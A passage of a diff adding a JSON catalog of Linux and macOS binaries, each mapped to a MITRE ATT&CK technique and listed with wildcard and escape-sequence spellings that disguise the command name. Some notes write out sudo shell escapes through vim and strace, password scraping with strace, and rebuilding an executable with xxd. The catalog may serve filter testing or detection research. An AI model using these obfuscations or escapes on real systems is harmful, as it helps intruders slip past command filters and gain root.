+      "https://pip.pypa.io/en/stable/cli/pip_install/"
+    ]
+  },
+  {
+    "Name": "python3",
+    "Description": "Python 3 interpreter. Enables arbitrary code execution, file operations, network connections, and more.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/python3",
+      "/usr/bin/python3.x",
+      "/usr/local/bin/python3"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.006",
+    "Patterns": [
+      {
+        "Pattern": "python?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Matches python3, python2, etc."
+      },
+      {
+        "Pattern": "p?thon3",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'y'"
+      },
+      {
+        "Pattern": "py*3",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'thon'"
+      },
+      {
+        "Pattern": "pyth[o]n3",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'o'"
+      },
+      {
+        "Pattern": "p*3",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Aggressive star wildcard"
+      },
+      {
+        "Pattern": "python[3]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on version digit"
+      },
+      {
+        "Pattern": "/usr/bin/python?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard on version"
+      },
+      {
+        "Pattern": "/???/bin/p*3",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path with mixed wildcards"
+      },
+      {
+        "Pattern": "py?hon3",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 't'"
+      },
+      {
+        "Pattern": "/usr/*/python3",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard in directory traversal"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/006/",
+      "https://docs.python.org/3/"
+    ]
+  },
+  {
+    "Name": "rsync",
+    "Description": "Fast, versatile file copying tool. Supports remote file sync over SSH \u2014 useful for exfiltration, payload staging, and lateral file movement.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/rsync",
+      "/usr/local/bin/rsync"
+    ],
+    "Category": "exfiltration",
+    "MitreID": "T1048",
+    "Patterns": [
+      {
+        "Pattern": "rsyn?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'c'"
+      },
+      {
+        "Pattern": "r*c",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'syn'"
+      },
+      {
+        "Pattern": "rs[y]nc",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "r?ync",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 's'"
+      },
+      {
+        "Pattern": "rsyn[c]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/rsyn?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/r*c",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1048/",
+      "https://linux.die.net/man/1/rsync"
+    ]
+  },
+  {
+    "Name": "ruby",
+    "Description": "Ruby interpreter. Can be used for arbitrary code execution, reverse shells, and file operations.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/ruby",
+      "/usr/local/bin/ruby"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "rub?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'y'"
+      },
+      {
+        "Pattern": "r*y",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ub'"
+      },
+      {
+        "Pattern": "ru[b]y",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "r?by",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'u'"
+      },
+      {
+        "Pattern": "rub[y]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/rub?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/???/r*y",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://www.ruby-lang.org/"
+    ]
+  },
+  {
+    "Name": "scp",
+    "Description": "Secure Copy Protocol. Used for file transfer between hosts over SSH \u2014 exfiltration, payload staging, or lateral file movement.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/scp",
+      "/bin/scp"
+    ],
+    "Category": "exfiltration",
+    "MitreID": "T1048.002",
+    "Patterns": [
+      {
+        "Pattern": "sc?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'p'"
+      },
+      {
+        "Pattern": "s*p",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'c'"
+      },
+      {
+        "Pattern": "s[c]p",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "sc[p]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/sc?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/scp",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1048/002/"
+    ]
+  },
+  {
+    "Name": "screen",
+    "Description": "Terminal multiplexer. Can create persistent sessions that survive logout, run background processes, and escape restricted shells.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/screen",
+      "/bin/screen"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.004",
+    "Patterns": [
+      {
+        "Pattern": "scree?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'n'"
+      },
+      {
+        "Pattern": "s*n",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'cree' \u2014 broad pattern, may match other s*n binaries"
+      },
+      {
+        "Pattern": "scr*n",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ee' \u2014 more specific"
+      },
+      {
+        "Pattern": "scree[n]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on final char"
+      },
+      {
+        "Pattern": "/usr/bin/scree?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path with wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bin/screen",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ directory"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/scree?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/screen; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x73\\x63\\x72\\x65\\x65\\x6e'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'screen'"
+      }
+    ],
+    "PlatformNotes": "screen -dmS name cmd runs a detached named session. Sessions survive SSH disconnects. If screen has SUID permissions: `screen -x 'attacker/cmd'` can escape to a shell. GTFOBins documents screen as a SUID privilege escalation vector.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/004/",
+      "https://gtfobins.github.io/gtfobins/screen/",
+      "https://man7.org/linux/man-pages/man1/screen.1.html"
+    ]
+  },
+  {
+    "Name": "sed",
+    "Description": "Stream editor for filtering and transforming text. Can read arbitrary files, extract credentials from configs, or serve as a code execution vector via -e flag.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/sed",
+      "/usr/bin/sed"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "se?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'd'"
+      },
+      {
+        "Pattern": "s*d",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'e'"
+      },
+      {
+        "Pattern": "s[e]d",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "se[d]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/bin/se?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/sed",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://www.gnu.org/software/sed/manual/"
+    ]
+  },
+  {
+    "Name": "socat",
+    "Description": "Multipurpose relay tool. More powerful than netcat \u2014 supports SSL, UDP, and complex socket operations. Commonly used for encrypted reverse shells and port forwarding.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/socat",
+      "/usr/local/bin/socat"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "soca?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 't'"
+      },
+      {
+        "Pattern": "s*t",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'oca'"
+      },
+      {
+        "Pattern": "so[c]at",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "s?cat",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'o'"
+      },
+      {
+        "Pattern": "soc[a]t",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on fourth char"
+      },
+      {
+        "Pattern": "/usr/bin/soca?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/s*t",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      },
+      {
+        "Pattern": "s?c*t",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Multiple wildcards in command"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://linux.die.net/man/1/socat"
+    ]
+  },
+  {
+    "Name": "ssh",
+    "Description": "Secure Shell client. Used for lateral movement, remote command execution, tunneling, and persistence via authorized_keys.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/ssh",
+      "/bin/ssh"
+    ],
+    "Category": "lateral-movement",
+    "MitreID": "T1021.004",
+    "Patterns": [
+      {
+        "Pattern": "ss?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'h'"
+      },
+      {
+        "Pattern": "s*h",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 's'"
+      },
+      {
+        "Pattern": "s[s]h",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "ss[h]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/ss?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/ssh",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      },
+      {
+        "Pattern": "/???/???/s*h",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path with mixed wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1021/004/",
+      "https://man.openbsd.org/ssh"
+    ]
+  },
+  {
+    "Name": "strace",
+    "Description": "System call tracer. Can monitor running processes, extract secrets from memory, and trace file/network operations for reconnaissance.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/strace",
+      "/bin/strace"
+    ],
+    "Category": "discovery",
+    "MitreID": "T1057",
+    "Patterns": [
+      {
+        "Pattern": "st*e",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'rac' \u2014 may match other st*e binaries"
+      },
+      {
+        "Pattern": "str?ce",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'a'"
+      },
+      {
+        "Pattern": "s*ce",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'tra' \u2014 broader pattern"
+      },
+      {
+        "Pattern": "strac[e]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on final char"
+      },
+      {
+        "Pattern": "/usr/bin/str?ce",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path with single wildcard"
+      },
+      {
+        "Pattern": "/???/bin/str?ce",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ and 'a' in strace"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/str?ce)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/strace; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x73\\x74\\x72\\x61\\x63\\x65'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'strace'"
+      }
+    ],
+    "PlatformNotes": "strace can extract credentials by tracing process syscalls: `strace -p <pid> -e read 2>&1 | grep -i pass`. If strace has sudo permissions, it enables shell escapes: `sudo strace -o /dev/null /bin/bash`. GTFOBins documents strace as a sudo escape vector.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1057/",
+      "https://gtfobins.github.io/gtfobins/strace/",
+      "https://man7.org/linux/man-pages/man1/strace.1.html"
+    ]
+  },
+  {
+    "Name": "tar",
+    "Description": "Archive utility. Used to compress and exfiltrate data, or extract attacker-controlled archives that may include path traversal payloads.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/bin/tar",
+      "/usr/bin/tar"
+    ],
+    "Category": "exfiltration",
+    "MitreID": "T1560.001",
+    "Patterns": [
+      {
+        "Pattern": "ta?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'r'"
+      },
+      {
+        "Pattern": "t*r",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'a'"
+      },
+      {
+        "Pattern": "t[a]r",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "ta[r]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/bin/ta?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/tar",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      },
+      {
+        "Pattern": "/b?n/t*r",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Mixed wildcards"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1560/001/"
+    ]
+  },
+  {
+    "Name": "vim",
+    "Description": "Vi Improved text editor. Can execute shell commands via :!cmd, spawn interactive shells, read and write arbitrary files, and is a common sudo escape vector.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/vim",
+      "/bin/vim",
+      "/usr/bin/vi"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059",
+    "Patterns": [
+      {
+        "Pattern": "vi?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'm' \u2014 also matches 'vi' binary if present"
+      },
+      {
+        "Pattern": "v?m",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'i'"
+      },
+      {
+        "Pattern": "v[i]m",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'i'"
+      },
+      {
+        "Pattern": "/usr/bin/vi?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bin/vi?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ and last char of vim"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/vi?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/vim; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x76\\x69\\x6d'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'vim'"
+      }
+    ],
+    "PlatformNotes": "vim can execute shell commands: `vim -c ':!whoami' -c ':q'`. For a persistent shell: `vim -c ':set shell=/bin/bash' -c ':shell'`. If vim runs with sudo: `sudo vim -c ':!bash'` drops to a root shell. GTFOBins documents vim as a file read/write, SUID, and sudo escape vector.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/",
+      "https://gtfobins.github.io/gtfobins/vim/"
+    ]
+  },
+  {
+    "Name": "wget",
+    "Description": "Non-interactive network downloader. Used to fetch files from HTTP/FTP servers, download payloads, or stage tools.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/wget",
+      "/bin/wget"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "wge?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 't'"
+      },
+      {
+        "Pattern": "w*t",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ge'"
+      },
+      {
+        "Pattern": "wg[e]t",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class around 'e'"
+      },
+      {
+        "Pattern": "w?et",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'g'"
+      },
+      {
+        "Pattern": "w?e?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Two wildcards replace 'g' and 't'"
+      },
+      {
+        "Pattern": "/usr/bin/wge?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard on last char"
+      },
+      {
+        "Pattern": "/???/bin/wget",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ directory"
+      },
+      {
+        "Pattern": "/???/???/w*",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path with mixed wildcards"
+      },
+      {
+        "Pattern": "w[g]et",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on second char"
+      },
+      {
+        "Pattern": "wge[t]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class matching last two chars (matches any single char in set)"
+      },
+      {
+        "Pattern": "for p in /usr/{bin,sbin}/wget; do \"$p\" && break; done",
+        "Wildcards": [
+          "{}"
+        ],
+        "Notes": "Brace expansion in for loop \u2014 tries both path alternatives"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/wge?)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/wget; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x77\\x67\\x65\\x74'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'wget' before execution"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://www.gnu.org/software/wget/manual/wget.html"
+    ]
+  },
+  {
+    "Name": "whoami",
+    "Description": "Prints the current user's username. Useful for confirming privilege level after exploitation.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/whoami",
+      "/bin/whoami"
+    ],
+    "Category": "discovery",
+    "MitreID": "T1033",
+    "Patterns": [
+      {
+        "Pattern": "w?oami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single char wildcard replaces 'h'"
+      },
+      {
+        "Pattern": "w*i",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'hoam'"
+      },
+      {
+        "Pattern": "who[a]mi",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class with single correct char"
+      },
+      {
+        "Pattern": "wh?ami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'o'"
+      },
+      {
+        "Pattern": "/usr/bin/w?oami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path with single wildcard"
+      },
+      {
+        "Pattern": "/???/???/whoami",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory components obfuscated with ? sequences"
+      },
+      {
+        "Pattern": "/???/b??/w*",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Combined ? and * across full path"
+      },
+      {
+        "Pattern": "w[ho]*i",
+        "Wildcards": [
+          "[]",
+          "*"
+        ],
+        "Notes": "Character class plus star for middle"
+      },
+      {
+        "Pattern": "wh[o]am[i]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Multiple character classes, each containing correct char"
+      },
+      {
+        "Pattern": "/usr/*/whoami",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Wildcard in directory component"
+      },
+      {
+        "Pattern": "for p in /usr/{bin,sbin}/whoami; do \"$p\" && break; done",
+        "Wildcards": [
+          "{}"
+        ],
+        "Notes": "Brace expansion in for loop \u2014 generates both path alternatives and executes the first valid one"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/wh?ami)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves the glob to a full path; command substitution executes the result"
+      },
+      {
+        "Pattern": "$'\\x77\\x68\\x6f\\x61\\x6d\\x69'",
+        "Wildcards": [],
+        "Notes": "ANSI-C quoting with hex escapes \u2014 shell expands to the string 'whoami' before execution"
+      },
+      {
+        "Pattern": "$'\\167\\150\\157\\141\\155\\151'",
+        "Wildcards": [],
+        "Notes": "ANSI-C quoting with octal escapes \u2014 expands to 'whoami'"
+      },
+      {
+        "Pattern": "shopt -s extglob; /usr/bin/@(who)ami",
+        "Wildcards": [
+          "@()"
+        ],
+        "Notes": "Extended glob \u2014 @(who) matches exactly the string 'who'; extglob must be enabled with shopt first"
+      }
+    ],
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1033/",
+      "https://man7.org/linux/man-pages/man1/whoami.1.html"
+    ]
+  },
+  {
+    "Name": "xxd",
+    "Description": "Hex dump and reverse hex dump utility. Can convert binaries to hex and reconstruct binaries from hex \u2014 useful for payload staging and encoding.",
+    "Platform": "linux",
+    "BinaryPath": [
+      "/usr/bin/xxd",
+      "/bin/xxd"
+    ],
+    "Category": "encode-decode",
+    "MitreID": "T1140",
+    "Patterns": [
+      {
+        "Pattern": "x?d",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'x'"
+      },
+      {
+        "Pattern": "xx[d]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Character class on last char"
+      },
+      {
+        "Pattern": "x*d",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'x'"
+      },
+      {
+        "Pattern": "/usr/bin/x?d",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path, wildcard on middle char"
+      },
+      {
+        "Pattern": "/???/bin/x?d",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Obfuscate /usr/ and the middle 'x'"
+      },
+      {
+        "Pattern": "$(ls /usr/bin/x?d)",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "ls resolves glob to /usr/bin/xxd; command substitution executes it"
+      },
+      {
+        "Pattern": "$'\\x78\\x78\\x64'",
+        "Wildcards": [],
+        "Notes": "ANSI-C hex escapes expand to 'xxd'"
+      }
+    ],
+    "PlatformNotes": "xxd can encode a binary to hex (`xxd -p file`) and reconstruct it (`xxd -r -p hexstring > file`). Useful for transferring binaries as hex strings over text channels. Combined with echo: `echo '7f454c46...' | xxd -r -p > /tmp/elf && chmod +x /tmp/elf`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1140/",
+      "https://linux.die.net/man/1/xxd"
+    ]
+  },
+  {
+    "Name": "curl",
+    "Description": "Transfer data from servers. macOS ships with curl by default. Used for C2, payload download, and exfiltration.",
+    "Platform": "macos",
+    "BinaryPath": [
+      "/usr/bin/curl"
+    ],
+    "Category": "download",
+    "MitreID": "T1105",
+    "Patterns": [
+      {
+        "Pattern": "cur?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Single wildcard replaces 'l'"
+      },
+      {
+        "Pattern": "c*l",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ur'"
+      },
+      {
+        "Pattern": "cu[r]l",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "c?r?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Two wildcards"
+      },
+      {
+        "Pattern": "/usr/bin/cur?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/curl",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Directory obfuscation"
+      },
+      {
+        "Pattern": "/???/???/c*l",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path with mixed wildcards"
+      }
+    ],
+    "PlatformNotes": "zsh (default shell on macOS) has stricter glob behavior than bash. By default, zsh will error if a glob matches no files (`nomatch` error). Use `setopt NO_NOMATCH` or `noglob` prefix to suppress. Also, zsh supports extended globs with `setopt EXTENDED_GLOB`.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1105/",
+      "https://curl.se/docs/manpage.html"
+    ]
+  },
+  {
+    "Name": "open",
+    "Description": "Open files, URLs, or applications. Can launch applications, execute scripts via -a flag, or open URLs that trigger protocol handlers.",
+    "Platform": "macos",
+    "BinaryPath": [
+      "/usr/bin/open"
+    ],
+    "Category": "execution",
+    "MitreID": "T1218",
+    "Patterns": [
+      {
+        "Pattern": "ope?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'n'"
+      },
+      {
+        "Pattern": "o*n",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'pe'"
+      },
+      {
+        "Pattern": "op[e]n",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on third char"
+      },
+      {
+        "Pattern": "o?en",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'p'"
+      },
+      {
+        "Pattern": "ope[n]",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on last char"
+      },
+      {
+        "Pattern": "/usr/bin/ope?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/o*n",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      }
+    ],
+    "PlatformNotes": "macOS-exclusive command. `open -a Calculator` opens an app by name. `open -n -a /Applications/Utilities/Terminal.app` opens a new Terminal. Can also open URLs: `open https://...` which triggers the default browser.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1218/",
+      "https://ss64.com/osx/open.html"
+    ]
+  },
+  {
+    "Name": "osascript",
+    "Description": "Execute AppleScript or JavaScript for Automation (JXA). Can control applications, access keychain, display prompts, and run system commands.",
+    "Platform": "macos",
+    "BinaryPath": [
+      "/usr/bin/osascript"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.002",
+    "Patterns": [
+      {
+        "Pattern": "osasc*",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Star matches 'ript'"
+      },
+      {
+        "Pattern": "o?ascript",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 's'"
+      },
+      {
+        "Pattern": "osa?cript",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 's' in middle"
+      },
+      {
+        "Pattern": "osascri?t",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'p'"
+      },
+      {
+        "Pattern": "o*t",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Aggressive star wildcard"
+      },
+      {
+        "Pattern": "/usr/bin/osasc*",
+        "Wildcards": [
+          "*"
+        ],
+        "Notes": "Full path wildcard"
+      },
+      {
+        "Pattern": "/???/bin/o*t",
+        "Wildcards": [
+          "?",
+          "*"
+        ],
+        "Notes": "Full path mixed wildcards"
+      },
+      {
+        "Pattern": "osascri[p]t",
+        "Wildcards": [
+          "[]"
+        ],
+        "Notes": "Bracket class on 'p'"
+      }
+    ],
+    "PlatformNotes": "osascript is macOS-exclusive. Use `-e` flag to pass inline code: `osascript -e 'do shell script \"id\"'`. JXA mode available with `-l JavaScript`. Wildcard execution requires shell glob expansion \u2014 works in bash and zsh (with NO_NOMATCH set).\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/002/",
+      "https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptX/AppleScriptX.html"
+    ]
+  },
+  {
+    "Name": "python3",
+    "Description": "Python 3 interpreter on macOS. Available via Xcode CLI tools or Homebrew. Enables arbitrary code execution and network operations.",
+    "Platform": "macos",
+    "BinaryPath": [
+      "/usr/bin/python3",
+      "/usr/local/bin/python3",
+      "/opt/homebrew/bin/python3"
+    ],
+    "Category": "execution",
+    "MitreID": "T1059.006",
+    "Patterns": [
+      {
+        "Pattern": "python?",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Matches python3, python2 etc."
+      },
+      {
+        "Pattern": "p?thon3",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "Wildcard replaces 'y'"
+      },
+      {
